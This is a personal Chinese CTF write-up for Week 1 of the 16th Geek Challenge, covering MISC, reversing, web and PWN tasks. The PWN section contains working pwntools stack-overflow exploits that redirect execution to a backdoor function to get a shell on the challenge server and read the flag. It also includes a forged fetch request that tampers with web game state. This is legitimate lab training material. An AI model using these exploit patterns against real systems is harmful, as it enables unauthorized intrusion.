# [个人] 第十六届极客大挑战的WriteUP



# Week1

## MISC

### HTTP

#### 解题过程

下载解压用`wireshark`打开附件看到可以编码

```
/pixel.gif?d=U1lDe1JfVV9BXw%3D%3D&s=00&r=0eeox3ps
/pixel.gif?d=RjBSM05TMUM1&s=01&r=h20hlp0i
/pixel.gif?d=X01BU1RFUj99&s=02&r=lywbp18i
```

**分析：**`%3D%3D`是通过URL编码`==`得到的所以我们猜测d=...%3D%3D&s=中`...`的内容是`Base64`加密后的数据

Base64解码得到

```
U1lDe1JfVV9BXw -> SYC{R_U_A_
RjBSM05TMUM1 -> F0R3NS1C5
X01BU1RFUj99 -> _MASTER?}
```

得到：SYC{R_U_A_F0R3NS1C5_MASTER?}



### 🗃️🗃️

#### 解题过程

从图片中的林荫道、传统风格的路灯以及整体景观布局，可以判断这是**北京市的天坛公园**

天坛公园以其古树成荫的环境和传统园林景观著称，这样的林荫道是公园内的典型场景

因此可以确定位置为SYC{北京市_天坛公园}

得到：SYC{北京市_天坛公园}



### Bite off picture

#### 解题过程

下载解压压缩包发现需要解压密码

根据题目提示用`010Edit`打开压缩包，移动到最下面看到

```
==gcyV2dyV2d
```

猜测是倒过来的`Base64编码`，解码得到

```
d2Vyd2Vycg==
# werwerr
```

得到解压密码：werwerr

解压得到一张图片

用`010Edit`打开调整高度`30` -> `FF`

看到图片显示出了flag

得到：SYC{mi3c_13_really_fun!!!!!}



### Blockchain Signln

挂一个web的`vpn`

根据题目提示访问区块链查询网址：`https://sepolia.etherscan.io/`

然后输入交易地址`0x208e0465ea757073d0ec6af9094e5404ef81a213970eb580fa6a28a3af4669d6`

在`Input Data`中找到`0x5359437b773362335f67346d335f73743472747d`

转成utf-8编码得到`SYC{w3b3_g4m3_st4rt}`

**得到：**SYC{w3b3_g4m3_st4rt}



### 1Z_Sign

#### 解题过程

根据题目提示`主网这笔交易交互池子的费率0x1d3040872d9c3d15d47323996926c2aa5c7b636fc7209f701301878dcf438598`

猜测这是一道关于区块链的sign题目

使用`Ethereum`查找一下这笔交易`https://goto.etherscan.com/tx/0x1d3040872d9c3d15d47323996926c2aa5c7b636fc7209f701301878dcf438598#eventlog`

然后在log日志中查到data

```
amount0 :
541168720375500939
amount1 :
-15225443441845645344768
sqrtPriceX96 :
13226520643709557354253154784891
liquidity :
181824344111125097411551
tick :
102358
fee :
9900
```

注意到`fee: 9900`

根据题目提示`请用SYC进行包裹结果，注意有百分比符号`

猜测flag为SYC{0.99%}

得到：SYC{0.99%}



## PWN

### Mission Calculator

#### 解题过程

下载解压扔进IDA代码审计，看到有提示

```c
  puts("You have 20 seconds to complete 50 simple math problems. Good luck!");
  puts("Press any key to start...");
```

猜测这是一道`计算题`

开启容器用`netcat`连接测试得到

```cmd
C:\Users\probie>nc geek.ctfplus.cn:30589
geek.ctfplus.cn:30589: forward host lookup failed: h_errno 11001: HOST_NOT_FOUND

C:\Users\probie>nc geek.ctfplus.cn 30589

 ________  ___       ________  ________  _____ ______   ___  ________   ________  ___  ________  ________
|\   ____\|\  \     |\   __  \|\   ____\|\   _ \  _   \|\  \|\   ____\ |\   ____\|\  \|\   __  \|\   ___  \
\ \  \___|\ \  \    \ \  \|\  \ \  \___|\ \  \\\__\ \  \ \  \ \  \___|_\ \  \___|\ \  \ \  \|\  \ \  \\ \  \
 \ \  \    \ \  \    \ \   __  \ \  \    \ \  \\|__| \  \ \  \ \_____  \\ \_____  \ \  \ \  \\\  \ \  \\ \  \
  \ \  \____\ \  \____\ \  \ \  \ \  \____\ \  \    \ \  \ \  \|____|\  \\|____|\  \ \  \ \  \\\  \ \  \\ \  \
   \ \_______\ \_______\ \__\ \__\ \_______\ \__\    \ \__\ \__\____\_\  \ ____\_\  \ \__\ \_______\ \__\\ \__\
    \|_______|\|_______|\|__|\|__|\|_______|\|__|     \|__|\|__|\_________\\_________\|__|\|_______|\|__| \|__|
                                                                 \|_________\|_________|

--------------------------------------------------------------------------------------------------------------------------------------------------------
You have 60 seconds to complete 50 simple math problems. Good luck!
Press any key to start...


Problem 1: 4182 * 147 = 614754
Correct!
Problem 2: 2758 * 8251 =
```

**分析：**

​	我们需要构造一个`计算脚本`payload.py

​	先发送任意字符开启挑战

​	然后接收题目，计算并发送答案

​	然后忽略掉`Correct!`如此循环`50`题目

构造并发送payload.py

```python
from pwn import *

r = remote("geek.ctfplus.cn", 30589)

r.recvuntil(b"Press any key to start...")
r.send(b' ')

for i in range(50):
    r.recvuntil(b": ")
    problem = r.recvuntil(b' =', drop=True)
    problem = problem.decode("utf-8")
    a = int(problem.split(' * ')[0])
    b = int(problem.split(' * ')[1])
    answer = a * b
    print(f"题目{i+1}: {problem} = {answer}")
    r.sendline(str(answer).encode("utf-8"))
    r.recvuntil(b"Correct!")

r.interactive()
```

**解读：**我们用pwntools构造这样的计算脚本，注意细节正确截取题目内容

响应

```
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test03\Main.py 
[x] Opening connection to geek.ctfplus.cn on port 30589
[x] Opening connection to geek.ctfplus.cn on port 30589: Trying 222.186.150.28
[+] Opening connection to geek.ctfplus.cn on port 30589: Done
题目1: 2102 * 2404 = 5053208
题目2: 2102 * 2404 = 5053208
题目3: 2102 * 2404 = 5053208
...
题目48: 5266 * 9279 = 48863214
题目49: 5266 * 9279 = 48863214
题目50: 5266 * 9279 = 48863214
[*] Switching to interactive mode
Congratulations! You have completed all 50 math problems.
```

这样我们就成功获得了shell了实行指令

```shell
ls
bin
calc
dev
etc
flag
lib
lib64
cat flag
SYC{m4th-15s0-435y-019a4dff38f7738085f29cb7b6276bc4}
```

得到：SYC{m4th-15s0-435y-019a4dff38f7738085f29cb7b6276bc4}



### Mission Cipher Text

#### 解题过程

下载解压扔进IDA代码审计，看到源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
  banner();
  menu();
  v4 = readchoice();
  if ( v4 == 1 )
  {
    output_history();
  }
  else
  {
    if ( v4 != 2 )
      exit(0);
    submit_feedback();
  }
  return 0;
}

int readchoice()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  read(0, buf, 8uLL);
  return atoi(buf);
}

size_t submit_feedback()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("Please enter your feedback:");
  close(1);
  read(0, buf, 0x100uLL);
  return fwrite("\x1B[1m\x1B[95mwe are here waiting for you\x1B[0m\n", 1uLL, 0x29uLL, stderr);
}
```

**解读：**

- 它有两处输入的地方`read(0, buf, 8uLL);`和`read(0, buf, 0x100uLL);`

- 第一处没什么问题，第二处存在很明显的栈溢出漏洞可以利用

- 所以为了去到第二处我们要在第一处输入`2`触发`submit_feedback()`

然后找一下，找到一个后门函数

```
.text:00000000004014AB                 public b4ckd00r
.text:00000000004014AB b4ckd00r        proc near
.text:00000000004014AB ; __unwind {
.text:00000000004014AB                 endbr64
.text:00000000004014AF                 push    rbp
.text:00000000004014B0                 mov     rbp, rsp
.text:00000000004014B3                 lea     rax, command    ; "/bin/sh"
.text:00000000004014BA                 mov     rdi, rax        ; command
.text:00000000004014BD                 call    _system
.text:00000000004014C2                 nop
.text:00000000004014C3                 pop     rbp
.text:00000000004014C4                 retn
.text:00000000004014C4 ; } // starts at 4014AB
.text:00000000004014C4 b4ckd00r        endp
```

拿到binsh的偏移地址`0x4014B3`

构造并发送payload.py

```python
from pwn import *

r = remote("geek.ctfplus.cn", 32350)

r.sendline(b'2')
r.sendline(b'a'*(32+4*2)+p64(0x4014B3)+p64(0x00))

r.interactive()
```

**分析：**

- `32`是为了填满buf

- `4*2`是为了填满`rbp``

- `0x4014B3`是后门偏移地址

- `0x00`是为了栈对齐

然后就拿到了shell

**尝试1：**

```shell
ls
ls: write error: Bad file descriptor
```

这是因为它在我们get到shell之前执行了`close(1);`

| FD 编号 | 名称   | 含义         | 常用场景                   |
| ------- | ------ | ------------ | -------------------------- |
| 0       | stdin  | 标准输入     | 键盘输入、程序读取输入     |
| 1       | stdout | 标准输出     | 命令输出、printf/puts 打印 |
| 2       | stderr | 标准错误输出 | 错误信息打印（如报错提示） |

即使`1`不能用了，我们也可以使用`2`来输出

**尝试2：**

重定向FD

```shell
exec 1>&2
ls
bin
dev
etc
flag
ld-linux-x86-64.so.2
lib
lib64
libc.so.6
pwn
cat flag
SYC{w3-4r3-w4tch1n9-019a4e54693d7f71a5e1d22cdfe643b9}
```

**得到：**SYC{w3-4r3-w4tch1n9-019a4e54693d7f71a5e1d22cdfe643b9}



### 次元囚笼

#### 解题过程

下载解压扔进IDA代码审计，看到源码

```c
-------------------------------------------------------------------------------------------------------------------
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+Ch] [rbp-4h] BYREF

  init(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      __isoc99_scanf("%d", &v3);
      if ( v3 != 3 )
        break;
      love_me();
    }
    if ( v3 <= 3 )
    {
      if ( v3 == 1 )
      {
        miss_me();
      }
      else if ( v3 == 2 )
      {
        abandon_me();
      }
    }
  }
}
-------------------------------------------------------------------------------------------------------------------
ssize_t love_me()
{
  puts("give me your love ");
  return read(0, buffer, 0x32uLL);
}
c
int miss_me()
{
  __int64 v0; // rax

  if ( strlen(buffer) > 0x20 )
  {
    LODWORD(v0) = puts("but I don't want to give up on you");
  }
  else
  {
    puts("I've let it go, so follow your heart");
    return leave() + 1;
  }
  return v0;
}
-------------------------------------------------------------------------------------------------------------------
__int64 abandon_me()
{
  _BYTE buf[512]; // [rsp+0h] [rbp-200h] BYREF

  printf("Is this necessary? That's my prayer");
  read(0, buf, 0x200uLL);
  return leave();
}
-------------------------------------------------------------------------------------------------------------------
int leave()
{
  char dest[32]; // [rsp+0h] [rbp-20h] BYREF

  strcpy(dest, buffer);
  if ( strcmp(dest, "love") )
    return puts("it's all of you");
  puts("yes I wait for you forever");
  return read(0, buffer, 0x100uLL);
}
-------------------------------------------------------------------------------------------------------------------
```

**解读：**

- 简单审计一下代码发现`leave`函数中有一个地方可以利用栈溢出的漏洞`strcpy(dest, buffer);`
- 我们用`love_me`来设置`buffer`的payload然后通过`abandon_me`来触发`leave`

然后来找一下，发现一个后门函数

```
.text:00000000004012B3                 public last_love
.text:00000000004012B3 last_love       proc near
.text:00000000004012B3 ; __unwind {
.text:00000000004012B3                 endbr64
.text:00000000004012B7                 push    rbp
.text:00000000004012B8                 mov     rbp, rsp
.text:00000000004012BB                 lea     rax, aIKnowYouPreten ; "I know you pretend to love me , but thi"...
.text:00000000004012C2                 mov     rdi, rax        ; s
.text:00000000004012C5                 call    _puts
.text:00000000004012CA                 lea     rax, aILeaveSomethin ; "I leave something you want,and Farewell"
.text:00000000004012D1                 mov     rdi, rax        ; s
.text:00000000004012D4                 call    _puts
.text:00000000004012D9                 lea     rax, command    ; "/bin/sh"
.text:00000000004012E0                 mov     rdi, rax        ; command
.text:00000000004012E3                 mov     eax, 0
.text:00000000004012E8                 call    _system
.text:00000000004012ED                 nop
.text:00000000004012EE                 pop     rbp
.text:00000000004012EF                 retn
.text:00000000004012EF ; } // starts at 4012B3
.text:00000000004012EF last_love       endp
```

得到binsh的后门偏移地址`4012D9`

构造并发送payload.py

```python
from pwn import *

r = remote("geek.ctfplus.cn", 30736)

# love me
r.recvuntil(b"cin >> : ")
r.sendline(b'3')

# give love
r.recvuntil(b"give me your love")
r.sendline(b'a'*(32+8)+p64(0x4012D9))

# abandon me
r.recvuntil(b"cin >> : ")
r.sendline(b'2')

# sure
r.recvuntil(b"Is this necessary? That's my prayer")
r.sendline(b"yes")

r.interactive()
```

**分析：**

- `32`是用于填充`dest`的垃圾字符
- `8`是用于填充`rbp基址寄存器`的垃圾字符
- `0x4012D9`是后门偏移地址
- 这里不用栈对齐

运行payload.py得到shell和指令响应

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test03\Main.py 
[x] Opening connection to geek.ctfplus.cn on port 30736
[x] Opening connection to geek.ctfplus.cn on port 30736: Trying 222.186.150.28
[+] Opening connection to geek.ctfplus.cn on port 30736: Done
[*] Switching to interactive mode
it's all of you
ls
bin
dev
flag
lib
lib32
lib64
libexec
libx32
pwn
cat flag
SYC{runasama_no_purezento:019a4e74002a73a18580106770dd7915}
```

**得到：**SYC{runasama_no_purezento:019a4e74002a73a18580106770dd7915}



## REVERSE

### ez_pyyy

#### 解题过程

下载解压得到附件：pyc.pyc

直接对其进行反编译

```cmd
python-3.13.0-amd64> uncompyle6 pyc.pyc > py.py
```

发现报错了，查看生成的py.py看到提示

```
# uncompyle6 version 3.9.3
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (tags/v3.8.10:3d8993a, May  3 2021, 11:48:03) [MSC v.1928 64 bit (AMD64)]
# Embedded file name: 太好了是python糕手我们有救了.py
# Compiled at: 2025-10-04 20:43:26
# Size of source mod 2**32: 1347 bytes
```

发现pyc.pyc对应的版本是**python3.8.0**，更换版本号继续

```cmd
python-3.8.10-amd64> uncompyle6 pyc.pyc > py.py
```

得到

```python
# uncompyle6 version 3.9.3
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (tags/v3.8.10:3d8993a, May  3 2021, 11:48:03) [MSC v.1928 64 bit (AMD64)]
# Embedded file name: 太好了是python糕手我们有救了.py
# Compiled at: 2025-10-04 20:43:26
# Size of source mod 2**32: 1347 bytes
cipher = [
 48, 55, 57, 50, 53, 55, 53, 50, 52, 50, 48, 55, 101, 52, 53, 50, 
 52, 50, 52, 50, 48, 55, 53, 55, 55, 55, 50, 54, 53, 55, 54, 55, 
 55, 55, 53, 54, 98, 55, 97, 54, 50, 53, 56, 52, 50, 52, 99, 54, 
 50, 50, 52, 50, 50, 54]

def str_to_hex_bytes(s: str) -> bytes:
    return s.encode("utf-8")


def enc(data: bytes, key: int) -> bytes:
    return bytes([b ^ key for b in data])


def en3(b: int) -> int:
    return b << 4 & 240 | b >> 4 & 15


def en33(data: bytes, n: int) -> bytes:
    """整体 bitstream 循环左移 n 位"""
    bit_len = len(data) * 8
    n = n % bit_len
    val = int.from_bytes(data, "big")
    val = (val << n | val >> bit_len - n) & (1 << bit_len) - 1
    return val.to_bytes(len(data), "big")


if __name__ == "__main__":
    flag = ""
    data = str_to_hex_bytes(flag)
    data = enc(data, 17)
    data = bytes([en3(b) for b in data])
    data = data[None[None:-1]]
    data = en33(data, 32)
    if data.hex() == cipher:
        print("Correct! ")
    else:
        print("Wrong！！！！！！！！")

# okay decompiling pyc.pyc
```

编写还原脚本

```python
cipher = [
  48, 55, 57, 50, 53, 55, 53, 50, 52, 50, 48, 55, 101, 52, 53, 50,
  52, 50, 52, 50, 48, 55, 53, 55, 55, 55, 50, 54, 53, 55, 54, 55,
  55, 55, 53, 54, 98, 55, 97, 54, 50, 53, 56, 52, 50, 52, 99, 54,
  50, 50, 52, 50, 50, 54
]

# 1. 将ASCII码转十六进制字符串
hex_str = ''.join(chr(x) for x in cipher)  # 得到54字符的hex

# 2. HEX转字节 (27字节)
data = bytes.fromhex(hex_str)

# 3. 循环移位逆操作 (总比特=27*8=216)
def en33(data: bytes, n: int) -> bytes:
    bit_len = len(data) * 8
    n = n % bit_len
    val = int.from_bytes(data, "big")
    val = (val << n | val >> bit_len - n) & ((1 << bit_len) - 1)
    return val.to_bytes(len(data), "big")

data = en33(data, 184)  # 循环右移32位 = 左移184位

# 4. 字节反转还原
data = data[::-1]

# 5. 高低位交换逆操作 (en3自逆)
def en3(b: int) -> int:
    return (b << 4 & 240) | (b >> 4 & 15)

data = bytes(en3(b) for b in data)

# 6. 异或解密
data = bytes(b ^ 17 for b in data)

# 7. UTF-8解码得Flag
flag = data.decode('utf-8')
print(f"Flag: {flag}")

# Flag: SYC{jtfgdsfda554_a54d8as53}
```

得到：SYC{jtfgdsfda554_a54d8as53}





## WEB

### 阿基里斯追乌龟

#### 解题过程

查看网页的index.js的源码

```js
/**
 * Encodes a JavaScript object to a Base64 string, with UTF-8 support.
 * @param {object} obj The object to encode.
 * @returns {string} The Base64 encoded string.
 */
function encryptData(obj) {
    const jsonString = JSON.stringify(obj);
    return btoa(unescape(encodeURIComponent(jsonString)));
}

/**
 * Decodes a Base64 string to a JavaScript object, with UTF-8 support.
 * @param {string} encodedString The Base64 encoded string.
 * @returns {object} The decoded object.
 */
function decryptData(encodedString) {
    const jsonString = decodeURIComponent(escape(atob(encodedString)));
    return JSON.parse(jsonString);
}

document.addEventListener('DOMContentLoaded', () => {
    const chaseBtn = document.getElementById('chase-btn');
    const achillesDistanceSpan = document.getElementById('achilles-distance');
    const tortoiseDistanceSpan = document.getElementById('tortoise-distance');
    const resultDiv = document.getElementById('result');

    let achillesPos = 0;
    let tortoisePos = 10000000000; // Initial head start for the tortoise

    achillesDistanceSpan.textContent = achillesPos.toFixed(2);
    tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2);

    chaseBtn.addEventListener('click', () => {
        // Achilles moves to the tortoise's current position
        const achillesMoveDistance = tortoisePos - achillesPos;
        achillesPos = tortoisePos;

        // The tortoise moves 1/10th of the distance Achilles just covered
        const tortoiseMoveDistance = achillesMoveDistance / 10;
        tortoisePos += tortoiseMoveDistance;

        achillesDistanceSpan.textContent = achillesPos.toFixed(2);
        tortoiseDistanceSpan.textContent = tortoisePos.toFixed(2);

        const payload = {
            achilles_distance: achillesPos,
            tortoise_distance: tortoisePos,
        };

        fetch('/chase', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ "data": encryptData(payload) }),
        })
        .then(response => response.json())
        .then(encryptedResponse => {
            if (encryptedResponse.data) {
                const data = decryptData(encryptedResponse.data);
                if (data.flag) {
                    // Use 'pre-wrap' to respect newlines in the fake flag message
                    resultDiv.style.whiteSpace = 'pre-wrap';
                    resultDiv.textContent = `你追上它了！\n${data.flag}`;
                    chaseBtn.disabled = true;
                } else if (data.message) {
                    resultDiv.textContent = data.message;
                }
            } else {
                console.error('Error:', encryptedResponse.error);
                resultDiv.textContent = `发生错误: ${encryptedResponse.error}`;
            }
        })
        .catch(error => {
            console.error('Error:', error);
            resultDiv.textContent = '发生错误。';
        });
    });
});
```

**解读：**

​	前端源码先定义了两个变量`achillesPos人的位置`和`tortoisePos乌龟的位置`

​	然后将它们封装成`payload`经过加密函数`encryptData(payload)`加密然后发送到路由`/chase`

​	后端处理数据后前端接收回调函数的数据`response`和`encryptedResponse`

​	flag就在`decryptData(encryptedResponse.data).flag`

**分析：**猜测只要`人的位置>=乌龟的位置`后端就会返回flag

**尝试1**：

利用精度丢失，后端每次处理数据都会将`人的位置传送到乌龟的位置`然后将`乌龟的位置+十分之一人的位置`，后端处理的次数越多两者的位置就会越接近，最后因为精度丢失而相等。

我们在console输入

```js
document.getElementById('chase-btn').click()
```

重复几次得到返回值

```
你追上它了！
哦天哪，可恶的浮点数问题，居然真的让你追到了。
然而这并不是预期的解法，阿基里斯可以跑得更快对吗？
SYC{this_is_fake_flag}
```

很明显这是一个fake(假)的flag，而且根据提示我们需要让人超过乌龟才能拿到正确的flag

**尝试2：**

为了让人追上乌龟，我们需要手动给后端发送请

模仿index.js的源码，我们构造相似的payload，但改动`achillesPos人的位置`和`tortoisePos乌龟的位置`

```js
// 定义人的位置>乌龟的位置
let achillesPos = 1;
let tortoisePos = 0;

// 封装payload
const payload = {
	achilles_distance: achillesPos,
	tortoise_distance: tortoisePos,
};

// 发送请求
fetch('/chase', {
	method: 'POST',
	headers: {
		'Content-Type': 'application/json',
	},
	body: JSON.stringify({ "data": encryptData(payload) }),
})
.then(response => response.json())

// 输出flag
.then(encryptedResponse => {console.log(decryptData(encryptedResponse.data).flag)})
```

得到：SYC{Spi1t_th3_T1me_t0_the_3nd_019a19d6193e7d4b816c324a6f4fb7f5}



# 后记

## 赠言

### 好好吃饭，认真睡觉。感谢相遇，铭记学习。——签到题怎么这么难